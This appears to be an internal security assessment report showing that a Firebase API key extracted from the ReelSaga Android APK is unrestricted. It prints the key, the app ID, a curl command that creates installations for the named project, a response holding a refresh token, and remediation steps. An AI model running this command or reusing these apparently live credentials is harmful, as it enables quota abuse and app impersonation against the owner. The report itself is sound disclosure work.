# Proof of Abuse — Firebase API Key (RS-01)

**Finding:** The `google_api_key` embedded in `res/values/strings.xml` is **not bound to the Android app** at the API level tested. An attacker with only the APK (or this report) can call Google Firebase APIs from **any machine** using `curl`.

## Step 1 — Extract key from APK (anyone can do this)

```bash
# From repo root
./app/scripts/01-extract-secrets-from-apk.sh reelsaga.apk
cat app/proof-of-exposure/extraction/output/secrets-snippet.xml
```

**Extracted value:**

```xml
<string name="google_api_key">AIzaSyBwKRNfSG-VXWiWVkD0pFG7PW6dcY8MMzM</string>
<string name="google_app_id">1:544458187694:android:d8ae8c1fbdcf21fc571e3f</string>
```

Source file in APK: `res/values/strings.xml` → also at `scraped/strings/strings.xml`

## Step 2 — Abuse from laptop (no phone, no root)

**Command run** (2026-06-10, AppSec assessment):

```bash
curl -X POST \
  "https://firebaseinstallations.googleapis.com/v1/projects/reel-saga-app/installations" \
  -H "Content-Type: application/json" \
  -H "x-goog-api-key: AIzaSyBwKRNfSG-VXWiWVkD0pFG7PW6dcY8MMzM" \
  -d '{
    "fid": "proof-of-exposure-test-fid",
    "authVersion": "FIS_v2",
    "appId": "1:544458187694:android:d8ae8c1fbdcf21fc571e3f",
    "sdkVersion": "o:android"
  }'
```

## Step 3 — Result

| Field | Value |
|-------|-------|
| HTTP status | **200 OK** |
| Meaning | Google accepted the API key and **created a Firebase Installation** |
| Attacker receives | `refreshToken`, `authToken` (JWT), installation `fid` |

**Saved response:** `03-firebase-installations-response.json`

### Redacted response shape (tokens shortened for this doc)

```json
{
  "name": "projects/544458187694/installations/fMxo3YYtqC12UHxFaij01N",
  "fid": "fMxo3YYtqC12UHxFaij01N",
  "refreshToken": "3_AS3qfwL53uO4TKy82I2QmvZA2ulcVbrxicvMn8xw3KII4LKT6uxOaE6FhhxcVc5w0J9KC_4eEgOI52cHlQ3szc0vqshSiQ95fuYjbvEGoQ_ss6w",
  "authToken": {
    "token": "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9....[JWT REDACTED IN SUMMARY]",
    "expiresIn": "604800s"
  }
}
```

> **Full token values** are in `03-firebase-installations-response.json` for internal engineering review only. Do not publish outside ReelSaga.

## What an attacker can do next

With a valid Firebase Installation auth token, depending on Firebase Security Rules and enabled services:

- Register unlimited fake app installations (analytics noise, quota burn)
- Attempt access to Firestore / Realtime DB / Storage if rules are misconfigured
- Impersonate app instances to Firebase backends that trust FIS tokens

## Additional test — Discovery API

Request to `discovery.googleapis.com` returned **403 API_KEY_SERVICE_BLOCKED** — some services are restricted, but **Firebase Installations is not sufficiently restricted**.

File: `02-discovery-api-response.json`

## Reproduce

```bash
./app/scripts/02-verify-firebase-key.sh
```

## Fix (dev team)

1. **Rotate** API key in Google Cloud Console immediately.
2. **Restrict** key: Android apps only + package `in.reelsaga.android` + release SHA-256.
3. Enable **Firebase App Check** (Play Integrity) on all callable Firebase resources.
4. Review Firebase Security Rules — deny unauthenticated writes.
5. Monitor Firebase console for anomalous installation counts.

See: [docs/remediation/DEV_TEAM_FIX_GUIDE.md](../../docs/remediation/DEV_TEAM_FIX_GUIDE.md)
